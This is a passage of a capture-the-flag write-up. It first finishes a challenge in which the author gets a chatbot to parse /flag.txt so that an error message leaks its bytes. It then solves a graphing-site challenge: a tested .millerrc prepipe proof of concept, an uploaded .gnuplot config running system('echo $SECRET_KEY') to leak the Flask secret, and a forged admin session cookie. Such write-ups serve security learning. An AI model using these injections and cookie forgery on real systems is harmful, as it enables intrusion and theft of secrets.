        <span class="n">num_candidates</span><span class="p">,</span> <span class="n">num_states</span><span class="p">,</span> <span class="n">total_votes</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="n">header_format</span><span class="p">,</span> <span class="n">binary_data</span><span class="p">)</span>
        <span class="n">result</span><span class="p">[</span><span class="s1">&#39;num_candidates&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_candidates</span>
        <span class="n">result</span><span class="p">[</span><span class="s1">&#39;num_states&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_states</span>
        <span class="n">result</span><span class="p">[</span><span class="s1">&#39;total_votes&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">total_votes</span>
    <span class="o">...</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="c1"># If we fail to parse our input, log what we have for debugging</span>
        <span class="n">_handle_parse_error</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</code></pre></div>
Its exception handler will also print all captured data prior to the error, hence allowing us to smuggle the first 24 bytes of a file. 
<div class="highlight"><pre><span></span><code>    <span class="k">def</span><span class="w"> </span><span class="nf">_handle_parse_error</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">error</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;PARSED DATA </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2"> prior to error&quot;</span><span class="p">)</span>
</code></pre></div>
Now, we ask the chatbot to run the forecast on <code>/flag.txt</code>, specifying that it has to include the exact error message(It'd simply say something went wrong otherwise). Those numbers can then be converted back to utf-8, giving us our flag
<div class="highlight"><pre><span></span><code><span class="n">long_numbers</span> <span class="o">=</span> <span class="p">[</span><span class="mi">7944425039487659110</span> <span class="p">,</span> <span class="mi">7232626473741477223</span> <span class="p">,</span> <span class="mi">9035755089488344128</span><span class="p">]</span>
<span class="n">byte_array</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
<span class="k">for</span> <span class="n">number</span> <span class="ow">in</span> <span class="n">long_numbers</span><span class="p">:</span>
    <span class="n">byte_array</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">number</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">))</span>
<span class="n">utf8_string</span> <span class="o">=</span> <span class="n">byte_array</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">utf8_string</span><span class="p">)</span>
</code></pre></div>
<code>flag{D@nger0us_d@tabase}</code></p>
<h1 id="graph-1">graph 1<a class="headerlink" href="#graph-1" title="Permanent link">&para;</a></h1>
<p>We have a website where we can upload csv files and download graphs made from the csvs we upload.
<img alt="Pasted image 20241104132737.png" src="../../assets/Pasted%20image%2020241104132737.png" />
<img alt="Pasted image 20241104132759.png" src="../../assets/Pasted%20image%2020241104132759.png" />
For this challenge, our goal seems to be getting the admin account and downloading it's files
<div class="highlight"><pre><span></span><code><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/signin&#39;</span><span class="p">)</span>  
<span class="k">def</span><span class="w"> </span><span class="nf">signin</span><span class="p">():</span>  
    <span class="k">if</span> <span class="s2">&quot;user&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>  
        <span class="c1"># TODO Perhaps this is our goal, to read the files of the admin  </span>
        <span class="k">if</span> <span class="n">sha512</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">==</span> <span class="n">environ</span><span class="p">[</span><span class="s1">&#39;ADMINHASH&#39;</span><span class="p">]:</span>  
            <span class="n">session</span><span class="p">[</span>  
                <span class="s2">&quot;user&quot;</span>  
            <span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;872bfdd01752ea2641a3e211db6127a7af1d9b44f1602780bbae465ccf4ac25e&#39;</span>  
        <span class="k">else</span><span class="p">:</span>  
            <span class="n">session</span><span class="p">[</span><span class="s2">&quot;user&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">token_hex</span><span class="p">()</span>  
        <span class="n">Path</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;DATA_DIR&#39;</span><span class="p">],</span> <span class="n">session</span><span class="p">[</span><span class="s2">&quot;user&quot;</span><span class="p">])</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">parents</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  
    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&quot;index&quot;</span><span class="p">))</span>
</code></pre></div>
Reviewing the source code, we see the tools miller and gnuplot are used for conversion and graphing respectively
<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">gnuplot</span><span class="p">(</span><span class="n">in_filename</span><span class="p">,</span> <span class="n">out_filename</span><span class="p">,</span> <span class="n">points</span><span class="p">):</span>  
    <span class="n">plot</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;  </span>
<span class="s2">set terminal png size 2048,512  </span>
<span class="s2">set output &#39;</span><span class="si">{</span><span class="n">out_filename</span><span class="si">}</span><span class="s2">&#39;  </span>
<span class="s2">set nokey  </span>
<span class="s2">plot &#39;</span><span class="si">{</span><span class="n">in_filename</span><span class="si">}</span><span class="s2">&#39; with </span><span class="si">{</span><span class="n">points</span><span class="si">}</span><span class="s2">  </span>
<span class="s2">&quot;&quot;&quot;</span>  
    <span class="n">p</span> <span class="o">=</span> <span class="n">Popen</span><span class="p">([</span><span class="s1">&#39;sandbox.sh&#39;</span><span class="p">,</span> <span class="s1">&#39;gnuplot&#39;</span><span class="p">],</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>  
    <span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">communicate</span><span class="p">(</span><span class="nb">input</span><span class="o">=</span><span class="n">plot</span><span class="p">)[</span><span class="mi">1</span><span class="p">:]</span>  
    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">returncode</span><span class="p">,</span> <span class="n">output</span>
<span class="o">...</span>
<span class="k">def</span><span class="w"> </span><span class="nf">convert</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">contents</span><span class="p">):</span>  
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">contents</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">):</span>  
        <span class="k">if</span> <span class="s1">&#39;,&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">line</span> <span class="ow">or</span> <span class="s1">&#39; &#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>  
            <span class="k">return</span> <span class="kc">False</span>  
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>  
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>  
    <span class="n">out</span> <span class="o">=</span> <span class="n">run</span><span class="p">(</span>  
        <span class="p">[</span><span class="s1">&#39;sandbox.sh&#39;</span><span class="p">,</span> <span class="s1">&#39;mlr&#39;</span><span class="p">,</span> <span class="s1">&#39;--icsvlite&#39;</span><span class="p">,</span> <span class="s1">&#39;--opprint&#39;</span><span class="p">,</span> <span class="s1">&#39;-N&#39;</span><span class="p">,</span> <span class="s1">&#39;cat&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">],</span>  
        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>  
    <span class="p">)</span><span class="o">.</span><span class="n">stdout</span>  
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>  
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>  
    <span class="k">return</span> <span class="kc">True</span>
</code></pre></div>
The above miller script takes in a csv file and prints it nicely in a table like format, spacing the entries apart neatly.
Hijacking the command is not possible here despite the file names being directly substituted in as all filenames are validated ensuring only alphabets,  <code>-_</code> and at most one <code>.</code> is allowed.
<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">isfilename</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>  
    <span class="k">return</span> <span class="n">s</span> <span class="ow">and</span> <span class="nb">all</span><span class="p">(</span>  
        <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s1">&#39;_-&#39;</span>  
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="c1"># Basically removes the first period</span>
    <span class="p">)</span>
</code></pre></div>
We also can't specify flags for the commands, as spaces are also disallowed.
Looking deeper into miller and gnuplot, we see that miller has its own scripting language(), which we could use to obtain environment variables. Gnuplot itself seems to be a script engine, meaning we could also use it to run commands. 
However, all those capabilities would be useless without a way to execute scripts. When searching for CVEs related to miller and gnuplot, I found this exploit for an old version of miller:
https://github.com/johnkerl/miller/security/advisories/GHSA-mw2v-4q78-j2cw
The exploit abuses the <code>--prepipe</code> flag, which pipes data into a command to allow it to be preprocessed. As <code>.millerrc</code> is a valid file name, we could upload the config file and get it to run any commands.
<div class="highlight"><pre><span></span><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;payload&quot;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>  
    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;csv&quot;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&quot;.millerrc&quot;</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="s2">&quot;text/csv&quot;</span><span class="p">)}</span>  
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://graph.chal.hackthe.vote/data&quot;</span>  
    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;session&quot;</span><span class="p">:</span> <span class="s2">&quot;...&quot;</span><span class="p">}</span>  
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</code></pre></div>
I tried this POC to see if the miller version used was vulnerable:
<code>prepipe,touch,maybe.csv;cat</code> 
Since spaces are not allowed in csv files(as from the above <code>convert</code> function), we use commas instead, which get replaced with spaces when the file is pretty printed. When the next csv file is uploaded, the config file should be loaded and the script should run.
Unfortunately, nothing appeared, meaning the miller used here was not vulnerable anymore.
What about gnuplot? If miller had its own config file, maybe gnuplot has one too?
Lo and behold, I found this https://stackoverflow.com/questions/1200463/is-there-a-gnuplot-configuration-file. It states</p>
<blockquote>
<p>"If the initialization file is found, gnuplot executes the commands in it. These may be any legal gnuplot commands, but typically they are limited to setting the terminal and defining frequently-used functions or variables."</p>
</blockquote>
<p>By uploading a  <code>.gnuplot</code> config file, we could run commands such as
<div class="highlight"><pre><span></span><code>projName=,system(&quot;echo,$SECRET_KEY&quot;)  
set,title,projName
</code></pre></div>
which gets converted into
<div class="highlight"><pre><span></span><code>secret= system(&quot;echo $SECRET_KEY&quot;)  
set       title        secret
</code></pre></div>
after being processed by miller. Now, when graphing an image, we also obtain the flask secret key.
(TODO Image here once the server is fixed)
From there, we can forge our flask session cookie with the admin user
<div class="highlight"><pre><span></span><code><span class="nb">print</span><span class="p">(</span><span class="n">FSCM</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;_5#y2LxF4Q8zxnxxec]/&quot;</span><span class="p">,</span> <span class="s1">&#39;{&quot;user&quot;: &quot;872bfdd01752ea2641a3e211db6127a7af1d9b44f1602780bbae465ccf4ac25e&quot;}&#39;</span><span class="p">))</span>
</code></pre></div></p>
<blockquote>
<p>Notes: Solutions have directly used miller config files with the <code>--from</code> flag to obtain flag1.csv from the admin user directory, however I did not try that as I was unsure what the sandbox limited me to.</p>
</blockquote>
<p>From there, we can download <code>flag1.csv</code> and get it plotted, showing this monstrosity
<img alt="Pasted image 20241104142726.png" src="../../assets/Pasted%20image%2020241104142726.png" />
Here, I could probably have used other graphing options but I just threw it into the site's grapher, hence making the letters incredibly hard to make out. 20 minutes of paint later, I was able to guess the flag
<img alt="Pasted image 20241104143008.png" src="../../assets/Pasted%20image%2020241104143008.png" />
<code>flag{contrived_scenario}</code></p>
<blockquote>
<p>Not shown: Hours of looking through miller and gnupot docs, checking stuff like special filenames for gnuplot and the miller and gnuplot DSL</p>
</blockquote>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.c8b220af.min.js"></script>
      
        <script src="../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
        <script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
      
    
  </body>
</html>